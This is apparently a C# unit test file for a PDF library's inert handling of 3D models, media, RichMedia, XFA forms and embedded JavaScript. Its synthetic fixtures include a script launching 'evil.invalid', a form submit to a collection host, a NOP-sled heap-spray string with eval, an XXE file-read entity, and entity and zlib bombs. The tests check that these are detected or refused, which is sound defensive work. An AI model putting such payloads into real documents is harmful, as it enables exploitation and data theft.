using System.Buffers.Binary;
using System.IO.Compression;
using System.Text;
using PortableDocument.Core;
using PortableDocument.Document;
using Xunit;
using DocumentRenderer = global::PortableDocument.Render.PortableDocument;

namespace FreeDF.Tests;

/// <summary>
/// Inert 3D (U3D/PRC), media evaluation, RichMedia, XFA and JavaScript analysis tests. All fixtures are synthetic, hand-built in this
/// file (no real third-party U3D/PRC/XFA samples are bundled, so no extra licences apply).
/// </summary>
public class InertActiveContentTests
{
    // ---- builders -------------------------------------------------------------------------------------------------

    static byte[] Str(string s)
    {
        var b = Encoding.UTF8.GetBytes(s);
        var r = new byte[2 + b.Length];
        BinaryPrimitives.WriteUInt16LittleEndian(r, (ushort)b.Length);
        b.CopyTo(r, 2);
        return r;
    }

    static byte[] Cat(params byte[][] parts) => parts.SelectMany(p => p).ToArray();
    static byte[] U32(uint v) { var b = new byte[4]; BinaryPrimitives.WriteUInt32LittleEndian(b, v); return b; }

    static byte[] Block(uint type, byte[] data, byte[]? meta = null)
    {
        meta ??= [];
        var padD = (4 - data.Length % 4) % 4;
        var padM = (4 - meta.Length % 4) % 4;
        return Cat(U32(type), U32((uint)data.Length), U32((uint)meta.Length), data, new byte[padD], meta, new byte[padM]);
    }

    static byte[] NodeData(string name, string[] parents, string? resource)
    {
        var parts = new List<byte[]> { Str(name), U32((uint)parents.Length) };
        foreach (var p in parents) { parts.Add(Str(p)); parts.Add(new byte[64]); }
        if (resource is not null) parts.Add(Str(resource));
        return Cat(parts.ToArray());
    }

    static byte[] Header(uint profile = 0x4) => Block(0x00443355, Cat(
        [1, 0, 0, 0], U32(profile), U32(0), new byte[8], U32(106)));

    static byte[] BuildU3d(int extraGroups = 0)
    {
        var parts = new List<byte[]>
        {
            Header(),
            Block(0xFFFFFF21, NodeData("Root", [], null)),
            Block(0xFFFFFF22, NodeData("Cube", ["Root"], "CubeMesh"), [1, 2, 3]),
            Block(0xFFFFFF23, NodeData("Lamp", ["Root"], "LampRes")),
            Block(0xFFFFFF24, NodeData("Cam", ["Root"], "ViewRes")),
            Block(0xFFFFFF55, Cat(Str("Tex"), new byte[10])),
            Block(0xFFFFFF54, Cat(Str("Mat"), new byte[10])),
            Block(0xFFFFFF31, Cat(Str("CubeMesh"), new byte[10])),
            Block(0xFFFFFF3B, new byte[8]),
        };
        for (var i = 0; i < extraGroups; i++) parts.Add(Block(0xFFFFFF21, NodeData("G" + i, [], null)));
        return Cat(parts.ToArray());
    }

    static string Pdf(string catalogExtra, string annots, string objects)
    {
        var sb = new StringBuilder("%PDF-2.0\n");
        sb.Append($"1 0 obj << /Type /Catalog /Pages 2 0 R {catalogExtra} >> endobj\n");
        sb.Append("2 0 obj << /Type /Pages /Kids [3 0 R] /Count 1 >> endobj\n");
        sb.Append($"3 0 obj << /Type /Page /Parent 2 0 R /MediaBox [0 0 200 200] /Annots [{annots}] >> endobj\n");
        sb.Append(objects);
        sb.Append("\ntrailer << /Root 1 0 R /Size 100 >>\n%%EOF\n");
        return sb.ToString();
    }

    static string StreamObj(int n, string dict, string content) =>
        $"{n} 0 obj << {dict} /Length {content.Length} >> stream\n{content}\nendstream\nendobj\n";

    static PdfDocument Load(string pdf) => PdfDocument.Load(Encoding.Latin1.GetBytes(pdf));

    // ---- U3D ------------------------------------------------------------------------------------------------------

    [Fact]
    public void U3d_blocks_nodes_and_counts_are_read_as_metadata()
    {
        var m = U3dReader.Read(BuildU3d());
        Assert.False(m.Malformed);
        Assert.False(m.Truncated);
        Assert.Equal(1, m.Header!.MajorVersion);
        Assert.True(m.Header.NoCompression);
        Assert.False(m.Header.Extensible);
        Assert.False(m.Header.DefinedUnits);
        Assert.Equal(106u, m.Header.CharacterEncoding);
        Assert.Equal(new[] { "Group", "Model", "Light", "View" }, m.Nodes.Select(n => n.Kind));
        Assert.Equal(["Root"], m.Nodes[1].Parents);
        Assert.Equal("CubeMesh", m.Nodes[1].ResourceName);
        Assert.Equal((1, 1, 1, 1, 1, 1, 1), (m.Summary.Groups, m.Summary.Models, m.Summary.Lights, m.Summary.Views, m.Summary.Textures, m.Summary.Materials, m.Summary.Meshes));
        Assert.Equal(1, m.Summary.Continuations);
        Assert.Equal("FileHeader", m.Blocks[0].TypeName);
    }

    [Fact]
    public void U3d_budgets_and_malformed_input_are_flagged_not_thrown()
    {
        var big = U3dReader.Read(BuildU3d(U3dReader.MaxNodes + 10));
        Assert.True(big.Truncated);
        Assert.Equal(U3dReader.MaxNodes, big.Nodes.Count);

        var cut = BuildU3d();
        var m = U3dReader.Read(cut.AsSpan(0, cut.Length - 5));
        Assert.True(m.Malformed);
        Assert.NotEmpty(m.Blocks);

        var lying = Cat(Header(), U32(0xFFFFFF22), U32(uint.MaxValue), U32(0));
        Assert.True(U3dReader.Read(lying).Malformed);
        Assert.True(U3dReader.Read([]).Malformed);
    }

    // ---- PRC ------------------------------------------------------------------------------------------------------

    static byte[] Zlib(byte[] data)
    {
        using var ms = new MemoryStream();
        using (var z = new ZLibStream(ms, CompressionLevel.Optimal, true)) z.Write(data);
        return ms.ToArray();
    }

    static byte[] BuildPrc(byte[] sectionPayload) => BuildPrcRaw(Zlib(sectionPayload));

    static byte[] BuildPrcRaw(byte[] sec)
    {
        var uuid = Enumerable.Range(1, 16).Select(i => (byte)i).ToArray();
        var fsBody = new List<byte>();
        fsBody.AddRange("PRC"u8.ToArray());
        fsBody.AddRange(U32(8137)); fsBody.AddRange(U32(8137));
        fsBody.AddRange(uuid); fsBody.AddRange(uuid);
        fsBody.AddRange(U32(1)); fsBody.AddRange(U32(3)); fsBody.AddRange([1, 2, 3]);
        // header: PRC + 2 versions + 2 uuids + count + 1 offset + model offset
        var headerLen = 3 + 8 + 32 + 4 + 4 + 4;
        var offsetsPos = headerLen + fsBody.Count;
        var sectionsStart = offsetsPos + 5 * 4;
        var offsets = Enumerable.Range(0, 5).Select(i => (uint)(sectionsStart + i * sec.Length)).ToArray();
        var file = new List<byte>();
        file.AddRange("PRC"u8.ToArray());
        file.AddRange(U32(8137)); file.AddRange(U32(8140));
        file.AddRange(uuid); file.AddRange(uuid);
        file.AddRange(U32(1)); file.AddRange(U32((uint)headerLen)); file.AddRange(U32(0));
        file.AddRange(fsBody);
        foreach (var o in offsets) file.AddRange(U32(o));
        for (var i = 0; i < 5; i++) file.AddRange(sec);
        return file.ToArray();
    }

    [Fact]
    public void Prc_header_structures_and_sections_are_summarised()
    {
        var m = PrcReader.Read(BuildPrc(new byte[1000]));
        Assert.False(m.Malformed);
        Assert.Equal(8140u, m.AuthoringVersion);
        var fs = Assert.Single(m.FileStructures);
        Assert.Equal([3L], fs.UncompressedFileSizes);
        Assert.Equal(["Globals", "Tree", "Tessellation", "Geometry", "ExtraGeometry"], fs.Sections.Select(s => s.Name));
        Assert.All(fs.Sections, s => { Assert.True(s.ZlibHeader); Assert.Equal(1000, s.InflatedLength); });
    }

    [Fact]
    public void Prc_inflate_is_capped_and_garbage_is_flagged()
    {
        var m = PrcReader.Read(BuildPrc(new byte[1]));
        Assert.False(m.Truncated);
        Assert.True(PrcReader.Read("PRC"u8).Malformed);
        Assert.True(PrcReader.Read(new byte[100]).Malformed);
    }

    [Fact]
    public void Model_is_read_from_a_pdf_3d_stream_by_subtype_without_decoding_geometry()
    {
        var u3d = Encoding.Latin1.GetString(BuildU3d());
        var pdf = Pdf("", "4 0 R", "4 0 obj << /Subtype /3D /3DD 5 0 R >> endobj\n" + StreamObj(5, "/Type /3D /Subtype /U3D", u3d));
        var doc = Load(pdf);
        var stream = Assert.IsType<Pdf3DStream>(doc.Get3DAnnotations()[0].StreamDetails);
        var data = doc.ReadModel(stream);
        Assert.Equal("U3D", data.Format);
        Assert.Equal(4, data.U3d!.Nodes.Count);
    }

    [Theory]
    [InlineData(0x0u, false, false)]
    [InlineData(0x2u, false, false)]
    [InlineData(0x4u, true, false)]
    [InlineData(0x6u, true, false)]
    [InlineData(0x8u, false, true)]
    public void U3d_profile_flags_follow_ecma_363_values(uint profile, bool noCompression, bool definedUnits)
    {
        var m = U3dReader.Read(Cat(Header(profile), Block(0xFFFFFF21, NodeData("R", [], null))));
        Assert.Equal(noCompression, m.Header!.NoCompression);
        Assert.Equal(definedUnits, m.Header.DefinedUnits);
        Assert.Equal((profile & 2) != 0, m.Header.Extensible);
    }

    [Fact]
    public void U3d_modifier_block_types_and_units_follow_the_standard()
    {
        var header = Block(0x00443355, Cat([1, 0, 0, 0], U32(0x8), U32(0), new byte[8], U32(106), BitConverter.GetBytes(0.001)));
        var m = U3dReader.Read(Cat(header, Block(0xFFFFFF43, []), Block(0xFFFFFF41, []), Block(0xFFFFFF46, []), Block(0x100, [])));
        Assert.Equal(0.001, m.Header!.UnitsScalingFactor);
        Assert.Equal(["FileHeader", "AnimationModifier", "GlyphModifier2D", "CLODModifier", "NewObject"], m.Blocks.Select(b => b.TypeName));
    }

    [Fact]
    public void U3d_max_blocks_is_enforced()
    {
        var parts = new List<byte[]> { Header() };
        for (var i = 0; i < U3dReader.MaxBlocks + 5; i++) parts.Add(Block(0x1234, []));
        var m = U3dReader.Read(Cat(parts.ToArray()));
        Assert.True(m.Truncated);
        Assert.Equal(U3dReader.MaxBlocks, m.Blocks.Count);
    }

    [Fact]
    public void Prc_zlib_bomb_is_capped_and_truncated_zlib_does_not_throw()
    {
        var bomb = PrcReader.Read(BuildPrc(new byte[70 * 1024 * 1024]));
        Assert.True(bomb.Truncated);
        var fs = Assert.Single(bomb.FileStructures);
        Assert.All(fs.Sections, s => Assert.True(s.InflatedLength is null or <= PrcReader.MaxInflatedBytes));
        Assert.Contains(fs.Sections, s => s.InflateTruncated);

        var noise = new byte[2000];
        new Random(7).NextBytes(noise);
        var z = Zlib(noise);
        var cut = PrcReader.Read(BuildPrcRaw(z[..(z.Length / 2)]));
        Assert.Equal(5, Assert.Single(cut.FileStructures).Sections.Count);
    }

    [Fact]
    public void Prc_non_monotonic_overlapping_and_duplicate_offsets_are_handled()
    {
        var good = BuildPrc(new byte[100]);
        const int offsetsPos = 55 + 54;
        var swapped = (byte[])good.Clone();
        BinaryPrimitives.WriteUInt32LittleEndian(swapped.AsSpan(offsetsPos + 8), 10);
        Assert.True(PrcReader.Read(swapped).Malformed);

        var overlap = (byte[])good.Clone();
        var first = BinaryPrimitives.ReadUInt32LittleEndian(overlap.AsSpan(offsetsPos));
        for (var i = 1; i < 5; i++) BinaryPrimitives.WriteUInt32LittleEndian(overlap.AsSpan(offsetsPos + 4 * i), first);
        var o = PrcReader.Read(overlap);
        Assert.Equal(5, Assert.Single(o.FileStructures).Sections.Count);

        // 64 header entries all pointing at the same structure yield one structure, not 64 inflations.
        const int delta = 4 * 63;
        var wide = new List<byte>(good[..43]);
        wide.AddRange(U32(64));
        for (var i = 0; i < 64; i++) wide.AddRange(U32(55 + (uint)delta));
        wide.AddRange(U32(0));
        var fsBytes = good[55..];
        for (var i = 0; i < 5; i++)
        {
            var at = 54 + 4 * i;
            BinaryPrimitives.WriteUInt32LittleEndian(fsBytes.AsSpan(at), BinaryPrimitives.ReadUInt32LittleEndian(fsBytes.AsSpan(at)) + (uint)delta);
        }
        wide.AddRange(fsBytes);
        var d = PrcReader.Read(wide.ToArray());
        Assert.Single(d.FileStructures);
    }

    // ---- multimedia -----------------------------------------------------------------------------------------------

    static PdfRendition SelectorRendition(string environmentMh)
    {
        var pdf = Pdf("", "4 0 R",
            "4 0 obj << /Type /Annot /Subtype /Screen /Rect [0 0 10 10] /A 5 0 R >> endobj\n" +
            "5 0 obj << /S /Rendition /OP 0 /R 6 0 R /AN 4 0 R >> endobj\n" +
            "6 0 obj << /Type /Rendition /S /SR /N (sel) /R [7 0 R 8 0 R 6 0 R] >> endobj\n" +
            "7 0 obj << /Type /Rendition /S /MR /N (hd) /MH << /C << /Z << /V [1920 1080] >> /R 5000 >> >> /C 9 0 R >> endobj\n" +
            "8 0 obj << /Type /Rendition /S /MR /N (french) /MH << /C << /L [(fr)] /C true >> >> /BE << /C << /R 99999 >> >> /C 9 0 R >> endobj\n" +
            "9 0 obj << /Type /MediaClip /S /MCD /N (c) /D << /Type /Filespec /F (https://example.invalid/x.mp4) >> /CT (video/mp4) >> endobj\n");
        return Assert.IsType<PdfRendition>(Load(pdf).GetRenditionActions()[0].Rendition);
    }

    [Fact]
    public void Would_play_selects_first_rendition_meeting_must_honor_criteria_and_is_cycle_safe()
    {
        var r = SelectorRendition("");
        var small = MediaPlaybackEvaluator.Evaluate(r, new PdfMediaEnvironment { ScreenWidth = 640, ScreenHeight = 480, BitRate = 1000, Languages = ["fr-CA"], Captions = true });
        Assert.True(small.WouldPlay);
        Assert.Equal("french", small.Selected!.Name);
        Assert.Contains(small.Checks, c => c.Set == "BE" && c.Criterion == "R" && c.Outcome == PdfMediaCheckOutcome.Unsatisfied);
        Assert.True(small.ExternalReference);
        Assert.Equal("TEMPNEVER", small.TemporaryFilePermission);

        var big = MediaPlaybackEvaluator.Evaluate(r, new PdfMediaEnvironment { ScreenWidth = 3840, ScreenHeight = 2160, BitRate = 10000 });
        Assert.Equal("hd", big.Selected!.Name);

        var unknown = MediaPlaybackEvaluator.Evaluate(r, new PdfMediaEnvironment());
        Assert.False(unknown.WouldPlay);
        Assert.NotEmpty(unknown.Reasons);
        Assert.Equal(small.Checks, MediaPlaybackEvaluator.Evaluate(r, new PdfMediaEnvironment { ScreenWidth = 640, ScreenHeight = 480, BitRate = 1000, Languages = ["fr-CA"], Captions = true }).Checks);
    }

    // ---- RichMedia ------------------------------------------------------------------------------------------------

    [Fact]
    public void RichMedia_content_is_typed_and_flash_is_only_flagged()
    {
        var pdf = Pdf("", "4 0 R 4 0 R",
            "4 0 obj << /Type /Annot /Subtype /RichMedia /Rect [0 0 10 10] /RichMediaContent 5 0 R >> endobj\n" +
            "5 0 obj << /Assets << /Names [(movie.swf) 6 0 R (clip.mp4) 7 0 R] >> /Configurations [8 0 R] /Views [<< /Type /3DView >>] >> endobj\n" +
            "6 0 obj << /Type /Filespec /F (movie.swf) >> endobj\n7 0 obj << /Type /Filespec /F (clip.mp4) >> endobj\n" +
            "8 0 obj << /Type /RichMediaConfiguration /Subtype /Flash /Instances [9 0 R 10 0 R] >> endobj\n" +
            "9 0 obj << /Type /RichMediaInstance /Subtype /Flash /Asset 6 0 R /Params << /FlashVars (a=b) /Binding /Bogus /CuePoints [1 2] >> >> endobj\n" +
            "10 0 obj << /Type /RichMediaInstance /Subtype /Video /Asset 7 0 R /Params << /Binding /Foreground >> >> endobj\n");
        var content = Load(pdf).GetRichMediaContent();
        Assert.Equal(2, content.Count);
        var c = content[0];
        Assert.True(c.HasFlash);
        Assert.Equal(["movie.swf", "clip.mp4"], c.Assets.Select(a => a.Name));
        var flash = c.Configurations[0].Instances[0];
        Assert.True(flash.IsFlash);
        Assert.Equal("movie.swf", flash.AssetName);
        Assert.Equal("None", flash.Parameters!.Binding);
        Assert.Equal("a=b", flash.Parameters.FlashVars);
        Assert.Equal(2, flash.Parameters.CuePointCount);
        Assert.Equal("Foreground", c.Configurations[0].Instances[1].Parameters!.Binding);
        Assert.Single(c.Views);
        Assert.Equal(1, content[1].AnnotationIndex);
    }

    // ---- XFA ------------------------------------------------------------------------------------------------------

    const string Template =
        "<template xmlns=\"http://www.xfa.org/schema/xfa-template/3.3/\"><subform name=\"form1\" layout=\"tb\">" +
        "<pageSet><pageArea name=\"P1\"/></pageSet>" +
        "<field name=\"Name\" access=\"open\"><ui><textEdit/></ui><value><text>Anon</text></value><bind match=\"dataRef\"/>" +
        "<event activity=\"click\"><script contentType=\"application/x-javascript\">app.launchURL('http://evil.invalid/');</script></event></field>" +
        "<field name=\"Ok\"><ui><button/></ui><event activity=\"initialize\"><script>$.rawValue = 1</script></event></field>" +
        "<draw name=\"d\"/><exclGroup name=\"g\"/><occur max=\"-1\"/></subform></template>";

    const string Datasets =
        "<xfa:datasets xmlns:xfa=\"http://www.xfa.org/schema/xfa-data/1.0/\"><xfa:data><form1><Name>Ada</Name><Items><Item>1</Item><Item>2</Item></Items></form1></xfa:data></xfa:datasets>";

    static string XfaPdf(string xfaPackets, string catalogExtra = "") =>
        Pdf("/AcroForm 5 0 R " + catalogExtra, "",
            "5 0 obj << /Fields [] /XFA " + xfaPackets + " >> endobj\n" +
            StreamObj(10, "", Template) + StreamObj(11, "", Datasets));

    [Fact]
    public void Xfa_packets_become_read_only_models_with_fields_data_and_scripts()
    {
        var doc = Load(XfaPdf("[(template) 10 0 R (datasets) 11 0 R]", "/NeedsRendering true"));
        var r = doc.GetXfaReport();
        Assert.True(r.Present);
        Assert.True(r.IsDynamic);
        Assert.Equal(["template", "datasets"], r.Packets.Select(p => p.Kind));
        var t = r.Template!;
        Assert.Equal((1, 2, 1, 1, 1, 2), (t.Subforms, t.Fields, t.ExclGroups, t.Draws, t.PageAreas, t.Scripts));
        Assert.True(t.HasFlowedOrRepeatingLayout);
        Assert.Equal(["tb"], t.Layouts);
        var name = t.FieldList[0];
        Assert.Equal(("form1.Name", "textEdit", "Anon", "dataRef"), (name.Path, name.Ui, name.DefaultValue, name.BindMatch));
        Assert.Equal("button", t.FieldList[1].Ui);
        Assert.Equal(["form1/Name", "form1/Items/Item", "form1/Items/Item"], r.Data.Select(d => d.Path));
        Assert.Equal("Ada", r.Data[0].Value);
        Assert.Equal(["click", "initialize"], r.Scripts.Select(s => s.Activity));
        Assert.False(r.Scripts[0].IsFormCalc);
        Assert.True(r.Scripts[1].IsFormCalc);
    }

    [Fact]
    public void Xfa_in_a_single_xdp_stream_is_split_and_static_by_default()
    {
        var xdp = "<xdp:xdp xmlns:xdp=\"http://ns.adobe.com/xdp/\">" + Template + Datasets + "</xdp:xdp>";
        var doc = Load(Pdf("/AcroForm 5 0 R", "", "5 0 obj << /XFA 10 0 R >> endobj\n" + StreamObj(10, "", xdp)));
        var r = doc.GetXfaReport();
        Assert.False(r.IsDynamic);
        Assert.Equal(2, r.Template!.Fields);
        Assert.Equal(3, r.Data.Count);
        Assert.False(Load(Pdf("", "", "")).GetXfaReport().Present);
    }

    [Fact]
    public void Xml_parser_rejects_dtds_and_never_reads_external_entities()
    {
        var secret = Path.Combine(Path.GetTempPath(), "xfa-xxe-" + Guid.NewGuid().ToString("N") + ".txt");
        File.WriteAllText(secret, "TOP-SECRET-MARKER");
        try
        {
            var xml = $"<?xml version=\"1.0\"?><!DOCTYPE d [<!ENTITY x SYSTEM \"{new Uri(secret).AbsoluteUri}\">]><d>&x;</d>";
            var parsed = XfaReader.ParseXml(Encoding.UTF8.GetBytes(xml));
            Assert.NotNull(parsed.Error);
            Assert.DoesNotContain("TOP-SECRET-MARKER", parsed.Root?.Text ?? "");

            var doc = Load(Pdf("/AcroForm 5 0 R", "", "5 0 obj << /XFA 10 0 R >> endobj\n" + StreamObj(10, "", xml)));
            var r = doc.GetXfaReport();
            Assert.DoesNotContain(r.Packets, p => p.Xml?.Root?.Text?.Contains("TOP-SECRET-MARKER") == true);
            Assert.NotNull(r.Packets[0].Xml!.Error);
        }
        finally { File.Delete(secret); }
    }

    [Fact]
    public void Xml_parser_bounds_depth_and_element_count()
    {
        var deep = string.Concat(Enumerable.Repeat("<a>", 200)) + string.Concat(Enumerable.Repeat("</a>", 200));
        var d = XfaReader.ParseXml(Encoding.UTF8.GetBytes(deep));
        Assert.True(d.Truncated);
        Assert.Equal("depth budget exceeded", d.Error);
        var wide = "<r>" + string.Concat(Enumerable.Repeat("<a/>", XfaReader.MaxElements + 5)) + "</r>";
        Assert.True(XfaReader.ParseXml(Encoding.UTF8.GetBytes(wide)).Truncated);
        Assert.NotNull(XfaReader.ParseXml("<a><b></a>"u8).Error);
    }

    // ---- JavaScript -----------------------------------------------------------------------------------------------

    [Fact]
    public void Analyzer_collects_functions_urls_and_apis_and_scores_deterministically()
    {
        const string js = """
            // app.launchURL("http://in-comment.invalid") must be ignored
            function helper(a) { return a; }
            var f = function notNamed() {};
            app.launchURL("https://example.invalid/path?q=1", true);
            this.submitForm({cURL: "http://collect.invalid/x"});
            this.importDataObject("a", "b.exe");
            var s = unescape("%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090");
            eval(s);
            Collab.collectEmailInfo({msg: "x"});
            """;
        var a = PdfJavaScriptAnalyzer.Analyze(js);
        Assert.Equal(["helper", "notNamed"], a.Functions);
        Assert.Equal(["https://example.invalid/path?q=1", "http://collect.invalid/x"], a.Urls);
        Assert.DoesNotContain("http://in-comment.invalid", a.Urls);
        Assert.Contains(a.ApiCalls, c => c.Name == "app.launchURL" && c.Category == "Network");
        Assert.Contains(a.ApiCalls, c => c.Name == "this.submitForm");
        Assert.Contains(a.ApiCalls, c => c.Name == "this.importDataObject");
        Assert.Contains(a.Findings, f => f.Name == "NopSledLiteral");
        Assert.Contains(a.Findings, f => f.Name == "eval");
        Assert.Equal(PdfJsRisk.High, a.Risk);
        var again = PdfJavaScriptAnalyzer.Analyze(js);
        Assert.Equal(a.RiskScore, again.RiskScore);
        Assert.True(a.Findings.SequenceEqual(again.Findings));
        Assert.True(a.ApiCalls.SequenceEqual(again.ApiCalls));
        Assert.False(a.Truncated);
    }

    [Fact]
    public void Analyzer_is_bounded_and_benign_code_is_clean()
    {
        var clean = PdfJavaScriptAnalyzer.Analyze("var x = 1 + 2; event.value = x;");
        Assert.Equal(PdfJsRisk.None, clean.Risk);
        var huge = PdfJavaScriptAnalyzer.Analyze(new string('a', PdfJavaScriptAnalyzer.MaxLength + 100));
        Assert.True(huge.Truncated);
        Assert.Equal(PdfJavaScriptAnalyzer.MaxLength + 100, huge.Length);
        var many = PdfJavaScriptAnalyzer.Analyze(string.Join(";", Enumerable.Range(0, 5000).Select(i => $"function f{i}(){{}}")));
        Assert.Equal(PdfJavaScriptAnalyzer.MaxItems, many.Functions.Count);
        Assert.Equal(PdfJsRisk.None, PdfJavaScriptAnalyzer.Analyze("\"unterminated string").Risk);
    }

    [Fact]
    public void Analyzer_detects_backslash_escaped_and_percent_u_payloads()
    {
        string Lit(string unit, int n) => "var s = \"" + string.Concat(Enumerable.Repeat(unit, n)) + "\";";
        foreach (var js in new[] { Lit("\\x90", 16), Lit("\\u9090", 16), Lit("%u9090", 16), Lit("\\u0c0c", 16), Lit("%u0c0c", 16) })
        {
            var a = PdfJavaScriptAnalyzer.Analyze(js);
            Assert.Contains(a.Findings, f => f.Name == "NopSledLiteral");
            Assert.Equal(PdfJsRisk.Medium, a.Risk);
        }
        var dense = PdfJavaScriptAnalyzer.Analyze(Lit("\\x41", 40));
        Assert.Contains(dense.Findings, f => f.Name == "DenseEscapedString");
        Assert.DoesNotContain(dense.Findings, f => f.Name == "NopSledLiteral");
        var spray = PdfJavaScriptAnalyzer.Analyze("var s = unescape(\"%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090\"); while (s.length < 0x40000) s += s;");
        Assert.Contains(spray.Findings, f => f.Name == "LoopedConcatenationWithSledOrLargeLiteral");
        Assert.Equal(PdfJsRisk.High, spray.Risk);
        Assert.Contains(PdfJavaScriptAnalyzer.Analyze(Lit("A", 10_000)).Findings, f => f.Name == "VeryLargeStringLiteral");
    }

    [Fact]
    public void Analyzer_token_budget_truncates()
    {
        var a = PdfJavaScriptAnalyzer.Analyze(string.Concat(Enumerable.Repeat("a;", PdfJavaScriptAnalyzer.MaxTokens / 2 + 10)));
        Assert.True(a.Truncated);
        Assert.Equal(PdfJavaScriptAnalyzer.MaxTokens, a.Tokens);
    }

    [Fact]
    public void Xml_entity_expansion_is_refused_before_expanding()
    {
        var laughs = "<?xml version=\"1.0\"?><!DOCTYPE lolz [<!ENTITY lol \"lol\"><!ENTITY lol2 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\">" +
            "<!ENTITY lol3 \"&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;\">]><lolz>&lol3;</lolz>";
        var sw = System.Diagnostics.Stopwatch.StartNew();
        var r = XfaReader.ParseXml(Encoding.UTF8.GetBytes(laughs));
        Assert.True(sw.ElapsedMilliseconds < 2000);
        Assert.NotNull(r.Error);
        Assert.Null(r.Root?.Text);
    }

    [Fact]
    public void Shared_compressed_script_stream_is_decoded_and_analysed_once()
    {
        byte[] Deflate(byte[] d)
        {
            using var ms = new MemoryStream();
            using (var z = new ZLibStream(ms, CompressionLevel.Optimal, true)) z.Write(d);
            return ms.ToArray();
        }
        var bomb = Deflate(Encoding.ASCII.GetBytes(string.Concat(Enumerable.Repeat("a=1;\n", 800_000))));
        const int n = 2000;
        var sb = new StringBuilder("%PDF-2.0\n1 0 obj << /Type /Catalog /Pages 2 0 R >> endobj\n2 0 obj << /Type /Pages /Kids [3 0 R] /Count 1 >> endobj\n");
        sb.Append("3 0 obj << /Type /Page /Parent 2 0 R /MediaBox [0 0 10 10] /Annots [")
          .Append(string.Join(" ", Enumerable.Range(0, n).Select(i => $"{100 + i} 0 R"))).Append("] >> endobj\n");
        sb.Append("7 0 obj << /S /JavaScript /JS 8 0 R >> endobj\n");
        sb.Append($"8 0 obj << /Filter /FlateDecode /Length {bomb.Length} >> stream\n").Append(Encoding.Latin1.GetString(bomb)).Append("\nendstream\nendobj\n");
        for (var i = 0; i < n; i++) sb.Append($"{100 + i} 0 obj << /Type /Annot /Subtype /Link /Rect [0 0 1 1] /A 7 0 R >> endobj\n");
        sb.Append("trailer << /Root 1 0 R /Size 3000 >>\n%%EOF\n");
        var doc = Load(sb.ToString());
        var sw = System.Diagnostics.Stopwatch.StartNew();
        var report = doc.GetJavaScriptReport();
        Assert.True(sw.Elapsed < TimeSpan.FromSeconds(10), sw.Elapsed.ToString());
        Assert.NotEmpty(report.Sources);
        Assert.True(report.Sources.Select(s => s.Analysis).Where(a => a is not null).Distinct(ReferenceEqualityComparer.Instance).Count() <= 1);
    }

    [Fact]
    public void Document_report_covers_action_and_xfa_scripts()
    {
        var pdf = Pdf("/OpenAction 6 0 R /AcroForm 5 0 R", "4 0 R",
            "4 0 obj << /Type /Annot /Subtype /Widget /FT /Btn /T (go) /Rect [0 0 1 1] /A 7 0 R >> endobj\n" +
            "5 0 obj << /Fields [4 0 R] /XFA [(template) 10 0 R] >> endobj\n" +
            "6 0 obj << /S /JavaScript /JS (eval(unescape('%41'));) >> endobj\n" +
            "7 0 obj << /S /JavaScript /JS 8 0 R >> endobj\n" + StreamObj(8, "", "app.launchURL('http://x.invalid')") +
            StreamObj(10, "", Template));
        var r = Load(pdf).GetJavaScriptReport();
        Assert.Contains(r.Sources, s => s.Origin == "Action" && s.Analysis!.Findings.Any(f => f.Name == "eval"));
        Assert.Contains(r.Sources, s => s.Origin == "Action" && s.Analysis!.Urls.Contains("http://x.invalid"));
        Assert.Contains(r.Sources, s => s.Origin == "Xfa" && s.Language == "FormCalc" && s.Analysis is null);
        Assert.Contains(r.Sources, s => s.Origin == "Xfa" && s.Language == "JavaScript");
        Assert.Equal(PdfJsRisk.Medium, r.Risk);
    }

    // ---- security -------------------------------------------------------------------------------------------------

    [Fact]
    public void Opening_listing_rendering_and_saving_never_touch_external_targets()
    {
        var marker = Path.Combine(Path.GetTempPath(), "inert-" + Guid.NewGuid().ToString("N") + ".txt");
        var spec = marker.Replace("\\", "\\\\");
        var pdf = Pdf("/OpenAction 6 0 R /AcroForm 5 0 R", "4 0 R 11 0 R",
            "4 0 obj << /Type /Annot /Subtype /Screen /Rect [0 0 10 10] /A 7 0 R >> endobj\n" +
            $"5 0 obj << /Fields [] /XFA [(template) 10 0 R] >> endobj\n" +
            $"6 0 obj << /S /Launch /F ({spec}) /Win << /F ({spec}) >> >> endobj\n" +
            "7 0 obj << /S /Rendition /OP 0 /R 8 0 R /JS (app.launchURL('http://never.invalid'))>> endobj\n" +
            $"8 0 obj << /Type /Rendition /S /MR /C 9 0 R >> endobj\n9 0 obj << /Type /MediaClip /S /MCD /D << /F ({spec}) >> >> endobj\n" +
            "11 0 obj << /Type /Annot /Subtype /RichMedia /Rect [0 0 1 1] /RichMediaContent << /Configurations [<< /Subtype /Flash /Instances [<< /Subtype /Flash >>] >>] >> >> endobj\n" +
            StreamObj(10, "", Template));
        var bytes = Encoding.Latin1.GetBytes(pdf);
        var doc = PdfDocument.Load(bytes);
        _ = doc.GetActions();
        _ = doc.GetRenditionActions();
        _ = doc.GetRichMediaContent();
        _ = doc.GetXfaReport();
        _ = doc.GetJavaScriptReport();
        _ = DocumentRenderer.RenderPage(doc.Pages[0], 36);
        _ = PdfEditor.Open(bytes).Save();
        Assert.False(File.Exists(marker));
        Assert.True(doc.GetRichMediaContent()[0].HasFlash);
        foreach (var asm in new[] { typeof(PdfDocument).Assembly, typeof(PdfFile).Assembly })
            Assert.DoesNotContain(asm.GetReferencedAssemblies().Select(a => a.Name),
                n => n is "System.Net.Http" or "System.Diagnostics.Process" or "System.Net.Sockets" or "System.Net.WebClient" or "System.Net.Requests");
    }
}
